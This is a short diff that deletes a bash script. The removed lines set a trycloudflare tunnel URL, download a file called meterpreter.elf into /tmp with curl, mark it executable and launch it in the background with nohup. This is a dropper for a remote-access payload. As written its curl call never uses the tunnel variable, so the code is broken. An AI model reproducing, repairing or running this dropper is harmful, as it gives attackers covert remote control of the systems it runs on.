@@ -1,6 +1,0 @@
-#!/bin/bash
-CLOUDFLARE="https://physically-tutorial-cornwall-tagged.trycloudflare.com"  
-
-cd /tmp
-curl -s "/meterpreter.elf" -o meter.elf
-chmod +x meter.elf && nohup ./meter.elf &
